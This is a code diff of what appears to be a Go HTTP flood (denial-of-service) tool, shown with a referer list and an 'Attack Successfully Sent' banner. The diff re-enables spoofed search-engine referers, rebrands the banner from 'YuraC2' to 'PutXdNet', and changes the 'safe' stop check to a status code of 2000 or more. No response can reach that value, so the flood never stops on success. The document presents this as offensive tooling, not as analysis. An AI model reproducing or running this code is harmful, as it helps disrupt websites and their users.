@@ -34,8 +34,8 @@ var (
 		"http://www.google.com/?q=",
 		"http://www.usatoday.com/search/results?q=",
 		"http://engadget.search.aol.com/search?q=",
-		//"http://www.google.ru/?hl=ru&q=",
-		//"http://yandex.ru/yandsearch?text=",
+		"http://www.google.ru/?hl=ru&q=",
+		"http://yandex.ru/yandsearch?text=",
 		"https://www.google.com/search?q=",
 		"https://check-host.net/",
 		"https://www.facebook.com/",
@@ -347,7 +347,7 @@ func main() {
 	
 	
 	
-         fmt.Println("\u001B[31m>> \x1b[38;2;0;2555mAttack Successfully Sent To Website (\u001B[31mYuraC2\x1b[38;2;0;2555m) Servers! : (\u001B[31m17000\x1b[38;2;0;2555m) C2 Sent.\u001B[31m . \u001B[35m.\x1b[38;2;0;2555m") 
+         fmt.Println("\u001B[31m>> \x1b[38;2;0;2555mAttack Successfully Sent To Website (\u001B[31mPutXdNet\x1b[38;2;0;2555m) Servers! : (\u001B[31m17000\x1b[38;2;0;2555m) C2 Sent.\u001B[31m . \u001B[35m.\x1b[38;2;0;2555m") 
 		ss := make(chan uint8, 8)
 		var (
 			err, sent int32
@@ -435,7 +435,7 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 		r.Body.Close()
 		s <- callGotOk
 		if safe {
-			if r.StatusCode >= 200 {
+			if r.StatusCode >= 2000 {
 				s <- targetComplete
 			}
 		}
